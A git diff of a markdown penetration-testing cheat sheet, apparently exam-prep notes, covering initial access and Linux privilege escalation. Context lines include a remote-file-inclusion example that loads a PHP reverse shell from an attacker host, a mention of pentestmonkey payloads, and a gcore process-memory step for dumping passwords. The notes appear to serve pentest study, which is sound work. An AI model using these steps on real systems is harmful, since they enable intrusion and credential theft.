@@ -128,6 +128,7 @@ keepassxc
 ```
 
 # 🔹Initial Access
+
 ```
 Point of entry: web
 
@@ -138,7 +139,7 @@ On the Point of entry: can it be LFI // RFI?
 RFI: http://url.com/image.php?imd=http://KALI/PHP-reverse-shell.php
 
 
-```
+
 Public exploits-> Sometimes, you need to change the payload (or put some pentestmonkey payload)
 ![image](https://github.com/user-attachments/assets/11a91186-4558-42e7-b5c4-e3c2a0410752)
 
@@ -146,6 +147,13 @@ Public exploits-> Sometimes, you need to change the payload (or put some pentest
 ```
 
 # 🔹Linux Privilege Escalation
+
+
+```
+In the user's folder (or anywhere), do you see an .exe?
+Download it to the kali, and run strings.
+
+```
 
 ```
 Sudo -l -> gcore -> check running processes for any Password dumping related processes
